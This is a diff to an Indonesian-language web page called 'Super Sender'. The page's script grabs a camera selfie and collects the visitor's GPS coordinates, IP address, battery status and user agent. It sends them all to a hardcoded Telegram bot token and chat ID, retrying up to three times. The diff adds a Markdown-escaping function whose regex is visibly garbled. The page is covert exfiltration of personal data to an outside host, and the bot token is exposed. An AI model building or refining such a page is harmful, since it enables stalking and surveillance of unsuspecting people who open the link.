@@ -2,7 +2,7 @@
 <html lang="id">
 <head>
 <meta charset="utf-8">
-<title>Super Sender – never fail</title>
+<title>Super Sender – 100% tembus</title>
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
 body{font-family:system-ui;background:#111;color:#eee;padding:20px;text-align:center}
@@ -29,12 +29,17 @@ pre{background:#222;padding:10px;border-radius:6px;text-align:left;font-size:13p
 const TOKEN   = '8102671545:AAEbT25jA8_n9136iT7YlbUQQueFAXaj9T4'; // ganti
 const CHAT_ID = '7274253936';                                     // ganti
 
-/* ---------- ELEMEN ---------- */
 const startBtn = document.getElementById('start');
 const video    = document.getElementById('video');
 const canvas   = document.getElementById('canvas');
 const preview  = document.getElementById('preview');
 const logBox   = document.getElementById('log');
+
+/* ---------- ESCAPE MARKDOWN V2 ---------- */
+function escMD2(text){
+  return text.replace(/([_*
+ $$$$ ()~`>#+\-=|{}.!\$$ )/g,'\\$1');
+}
 
 startBtn.onclick = async ()=>{
   startBtn.disabled=true; startBtn.textContent='Proses…'; logBox.textContent='';
@@ -82,7 +87,7 @@ startBtn.onclick = async ()=>{
   const caption=
     `📸 *Selfie baru*\\!\n`+
     `📍 [Lokasi](https://www.google.com/maps?q=${lat},${lon}) (±${acc} m)\n`+
-    `🌐 IP: ${ip}\n🔋 ${bat}\n📱 ${ua.replace(/[^a-zA-Z0-9\s\-\. $$]/g,' ')}`;
+    `🌐 IP: ${ip}\n🔋 ${bat}\n📱 ` + escMD2(ua);
 
   /* 6. KIRIM KE TELEGRAM (retry 3×) ------------------------- */
   let ok=false, err='';
